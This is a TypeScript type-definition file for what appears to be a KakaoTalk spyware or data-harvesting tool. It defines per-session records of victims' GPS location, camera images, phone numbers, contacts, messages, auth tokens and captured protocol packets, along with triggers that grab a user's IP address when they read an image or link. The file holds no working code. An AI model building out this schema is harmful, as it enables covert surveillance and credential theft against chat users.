/**
 * 🔥 TYPE DEFINITIONS v31.2 🔥
 */

export interface AdminConfig {
  kakaoIds: string[];
  permissions: string[];
}

export interface TriggerConfig {
  triggers: {
    mention: { enabled: boolean; autoCollect: boolean };
    imageRead: { enabled: boolean; autoBlock: boolean; autoCollectIP: boolean };
    linkRead: { enabled: boolean; autoBlock: boolean; autoCollectIP: boolean };
  };
}

export interface UserData {
  kakaoId: string;
  nickname: string;
  profileImageUrl?: string;
  statusMessage?: string;
  deviceUUID: string;
  deviceName: string;
  lastSeen: number;
}

export interface GPSData {
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: number;
}

export interface IPData {
  ip: string;
  source: string;
  timestamp: number;
  userAgent?: string;
  triggeredBy?: string;
}

export interface CameraData {
  imageData: string;
  timestamp: number;
}

export interface PhoneData {
  number: string;
  type: string;
  timestamp: number;
}

export interface ContactData {
  source: string;
  kakaoId: string;
  nickname: string;
  profileImageUrl?: string;
  chatId?: string;
  timestamp: number;
}

export interface MessageData {
  chatId: string;
  messageId: string;
  senderId: string;
  senderName: string;
  type: number;
  content: string;
  timestamp: number;
  attachment?: {
    type: 'image' | 'link' | 'file';
    url?: string;
    data?: any;
  };
}

export interface TokenData {
  type: string;
  token: string;
  expiresAt?: number;
  timestamp: number;
}

export interface LOCOPacketData {
  packetId: number;
  method: string;
  methodId: number;
  statusCode: number;
  direction: 'send' | 'recv';
  bodyHex: string;
  bodyData?: string;
  bodySize: number;
  timestamp: number;
}

export interface HarvestedData {
  sessionId: string;
  user: Partial<UserData>;
  gps: GPSData[];
  ip: IPData[];
  camera: CameraData[];
  phone: PhoneData[];
  contacts: ContactData[];
  messages: MessageData[];
  tokens: TokenData[];
  locoPackets: LOCOPacketData[];
  binaryPackets: any[];
  protobufData: any[];
  timestamp: string;
}

export interface TriggerEvent {
  type: 'MENTION' | 'IMAGE_READ' | 'LINK_READ';
  triggeredBy: string;
  targetUserId?: string;
  chatId: string;
  messageId?: string;
  timestamp: number;
  ipData?: IPData;
}

export type TriggerCallback = (event: TriggerEvent) => void | Promise<void>;

export interface DatabaseAdmin {
  kakaoId: string;
  nickname: string;
  permissions: string[];
  addedAt: number;
}

export interface DatabaseBannedUser {
  kakaoId: string;
  reason: string;
  banType: 'TEMPORARY' | 'PERMANENT';
  bannedAt?: number;
  expiresAt?: number;
}

export interface DatabaseHarvestedData {
  sessionId: string;
  data: HarvestedData;
  savedAt: number;
}

export interface DataStatistics {
  totalSessions: number;
  totalMessages: number;
  totalContacts: number;
  totalPackets: number;
  totalIPs: number;
}